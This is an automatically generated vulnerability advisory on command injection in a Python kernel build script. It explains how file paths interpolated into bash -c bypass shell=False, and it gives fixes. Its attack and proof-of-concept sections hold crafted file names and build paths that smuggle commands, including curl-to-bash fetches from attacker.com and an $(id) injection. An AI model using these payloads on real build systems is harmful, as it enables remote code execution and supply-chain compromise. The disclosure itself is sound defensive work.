# VULN-007: Command Injection in build_opp_kernel_static.py

## Vulnerability Summary

| Attribute | Value |
|-----------|-------|
| **ID** | VULN-007 |
| **Type** | Command Injection |
| **CWE** | CWE-78 (OS Command Injection) |
| **Severity** | Critical |
| **Confidence** | 95% |
| **File** | `scripts/util/build_opp_kernel_static.py` |
| **Lines** | 36-42, 91-107, 123-137 |
| **Functions** | `shell_exec`, `compile_link_single`, `compile_ops_part_o` |
| **Status** | CONFIRMED |

## Vulnerability Description

The `shell_exec` function and its callers use `subprocess.Popen` with `shell=False` parameter, which would normally be safe. However, the commands are wrapped with `bash -c "..."` and use **f-string interpolation** to inject file paths directly into shell command strings. This completely bypasses the protection intended by `shell=False`, allowing shell metacharacter injection through file path variables.

### Vulnerable Code Pattern

```python
# Line 36-42: shell_exec function
def shell_exec(cmd, shell=False):
    try:
        ps = subprocess.Popen(cmd, shell)
        ps.communicate(timeout=180)
    except BaseException as e:
        log.error(f"shell_exec error: {e}")
        sys.exit(1)
```

```python
# Lines 91-97: compile_link_single - VULNERABLE
def compile_link_single(self, file_path, file_o):
    (dir_path, file_name) = os.path.split(file_path)
    if self.cpu_arch == Const.x86:
        shell_exec(["bash", "-c", f"cd {dir_path} && "
                                  f"objcopy --input-target binary --output-target elf64-x86-64 "
                                  f"--binary-architecture i386 "
                                  f"{file_name} {file_o}"], shell=False)
```

```python
# Lines 123-136: compile_ops_part_o - VULNERABLE
def compile_ops_part_o(self, out_path):
    # ...
    if self.cpu_arch == Const.x86 or (self.cpu_arch == Const.arm and platform.machine() != Const.x86):
        shell_exec(["bash", "-c", f"cd {out_path} && "
                                  f"ld -r {path_data_o} -o {path_part_o}"], shell=False)
```

## Data Flow Analysis

```
sys.argv (command line arguments)
    ↓
args.build_dir (user-controlled from -b/--build_dir)
    ↓
GenOpResourceIni(args.soc_version, args.build_dir).analyze_ops_files()
    ↓
self._binary_path = self._build_dir / "binary" / self._soc_version / "bin"
    ↓
File enumeration via json parsing and Path.iterdir()
    ↓
self._op_res[ops].kernel_files.extend(sorted(Path(ops_path).iterdir()))
    ↓
compile_link_o(op_out_path, file.resolve())
    ↓
compile_link_single(file_path, path_o_prefix)
    ↓
(dir_path, file_name) = os.path.split(file_path)  # ATTACKER CONTROLLED FILE NAME
    ↓
shell_exec(["bash", "-c", f"cd {dir_path} && objcopy ... {file_name} {file_o}"], shell=False)
    ↓
BASH EXECUTES INJECTED COMMAND
```

## Attack Vectors

### 1. Malicious File Name Injection (Primary Attack Vector)

**Prerequisites**: Attacker must be able to create or influence files in the build directory structure.

**Attack Scenario**:
1. Attacker gains write access to the `binary/<soc_version>/bin/` directory (e.g., via compromised dependency, malicious PR, or supply chain attack)
2. Attacker creates a file with malicious name:
   ```bash
   # File name with command injection payload
   touch '/build/binary/ascend910b/bin/kernel.o; curl http://attacker.com/exfil.sh | bash; #.o'
   ```
3. When build runs:
   ```bash
   python3 build_opp_kernel_static.py StaticCompile -s ascend910b -b /build -n=0 -a=x86_64
   ```
4. The f-string interpolation produces:
   ```bash
   bash -c "cd /build/binary/ascend910b/bin && objcopy --input-target binary ... kernel.o; curl http://attacker.com/exfil.sh | bash; #.o output.o"
   ```
5. **Result**: Remote Code Execution on the build server

### 2. Build Path Injection

**Prerequisites**: Attacker controls the `--build_dir` argument directly or via environment variables.

**Attack via build.sh**:
```bash
# build.sh passes BUILD_PATH directly
BUILD_PATH="/tmp/$(curl attacker.com/malicious_path)"
python3 build_opp_kernel_static.py StaticCompile -s ascend910b -b ${BUILD_PATH} ...
```

### 3. Zip Slip / Path Traversal Combination

If files are extracted from archives (tar, zip) without proper path validation:
```python
# Attacker-controlled archive with malicious file name
# archive.tar contains: "../../../bin/$(malicious_command).o"
```

## Exploitation Proof of Concept

### Local PoC

```bash
# 1. Navigate to project
cd /home/pwn20tty/Desktop/opencode_project/cann/1/ops-math

# 2. Create malicious file name in build structure
mkdir -p build/binary/ascend910b/bin/config/ascend910b
# File name with shell metacharacters
touch 'build/binary/ascend910b/bin/kernel$(id > /tmp/pwned).o'

# 3. Create a minimal JSON config to trigger the vulnerable code path
cat > build/binary/ascend910b/bin/config/ascend910b/test.json << 'EOF'
{
  "binList": [{
    "binInfo": {"jsonFilePath": "test.json"},
    "simplifiedKey": ["test_op/params"]
  }]
}
EOF

# 4. Run the vulnerable script
python3 scripts/util/build_opp_kernel_static.py StaticCompile \
    -s ascend910b \
    -b build \
    -n 0 \
    -a x86_64

# 5. Check exploitation result
cat /tmp/pwned  # If vulnerable, this file will contain uid/gid info
```

### Remote Attack Vector (Supply Chain)

```python
# Malicious upstream repository contains:
# File: binary/ascend910b/bin/kernel.o$(curl attacker.com/backdoor.sh | sh)

# When victim clones and builds:
git clone https://github.com/attacker/ops-math.git
cd ops-math
./build.sh  # RCE during build process
```

## Affected Code Locations

| Location | Lines | Vulnerability | Risk Level |
|----------|-------|---------------|------------|
| `shell_exec` | 36-42 | Passes commands to bash -c without sanitization | Medium |
| `compile_link_single` (x86) | 93-97 | Injects `{dir_path}`, `{file_name}`, `{file_o}` | Critical |
| `compile_link_single` (arm native) | 99-102 | Injects `{dir_path}`, `{file_name}`, `{file_o}` | Critical |
| `compile_link_single` (arm cross) | 104-107 | Injects `{dir_path}`, `{file_name}`, `{file_o}` | Critical |
| `compile_ops_part_o` (x86/arm) | 132-133 | Injects `{out_path}`, `{path_data_o}`, `{path_part_o}` | Critical |
| `compile_ops_part_o` (arm cross) | 135-136 | Injects `{out_path}`, `{path_data_o}`, `{path_part_o}` | Critical |

## Attack Complexity Assessment

| Factor | Rating | Rationale |
|--------|--------|-----------|
| **Access Required** | Low | Write access to build directory (common in CI/CD) |
| **Complexity** | Low | Simple file naming attack |
| **Privileges Required** | Low | Standard build user privileges |
| **User Interaction** | None | Automatic during build process |
| **Scope** | Changed | Can affect build server and downstream systems |
| **Impact** | Critical | Full RCE on build infrastructure |

**CVSS 3.1 Base Score: 8.8 (High)**
- Attack Vector: Local (can be elevated to Network via supply chain)
- Attack Complexity: Low
- Privileges Required: Low
- User Interaction: None
- Scope: Changed
- Confidentiality: High
- Integrity: High
- Availability: High

## Real-World Impact

### 1. Build Server Compromise
- Build servers typically have access to production credentials
- RCE on build server = potential access to deployment pipelines
- Can inject backdoors into compiled artifacts

### 2. Supply Chain Attack
- If attacker can submit malicious file names via PR or compromised dependency
- All users building from source would be compromised
- Difficult to detect (file names may look legitimate)

### 3. CI/CD Pipeline Compromise
- GitHub Actions, Jenkins, GitLab CI all execute builds
- Malicious file name in repository = instant CI/CD compromise
- Can exfiltrate secrets, inject malicious code into artifacts

## Recommended Remediation

### 1. Use shlex.quote() for Path Sanitization

```python
import shlex

def compile_link_single(self, file_path, file_o):
    (dir_path, file_name) = os.path.split(file_path)
    # Escape shell metacharacters
    safe_dir = shlex.quote(dir_path)
    safe_file = shlex.quote(file_name)
    safe_o = shlex.quote(file_o)
    
    if self.cpu_arch == Const.x86:
        shell_exec(["bash", "-c", f"cd {safe_dir} && "
                                  f"objcopy --input-target binary --output-target elf64-x86-64 "
                                  f"--binary-architecture i386 "
                                  f"{safe_file} {safe_o}"], shell=False)
```

### 2. Better: Avoid Shell Wrapper Entirely

```python
import subprocess

def compile_link_single(self, file_path, file_o):
    (dir_path, file_name) = os.path.split(file_path)
    
    if self.cpu_arch == Const.x86:
        subprocess.run(
            ["objcopy", "--input-target", "binary", 
                        "--output-target", "elf64-x86-64",
                        "--binary-architecture", "i386",
                        file_name, file_o],
            cwd=dir_path,  # Use cwd parameter instead of cd
            check=True,
            timeout=180
        )
```

### 3. Input Validation

```python
import re

def validate_path_component(component):
    """Validate that path component contains only safe characters"""
    if not re.match(r'^[a-zA-Z0-9_\-\.]+$', component):
        raise ValueError(f"Invalid path component: {component}")
    return component
```

## Verification Status

**CONFIRMED AS REAL VULNERABILITY**

This is not a false positive. The use of `bash -c` with f-string interpolation of file paths provides a direct injection vector for shell metacharacters, completely bypassing the `shell=False` protection.

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Python subprocess: shell=True vs shell=False](https://docs.python.org/3/library/subprocess.html#security-considerations)

---
*Generated by OpenCode Security Scanner - Detail Worker Agent*
*Analysis Date: 2026-04-21*
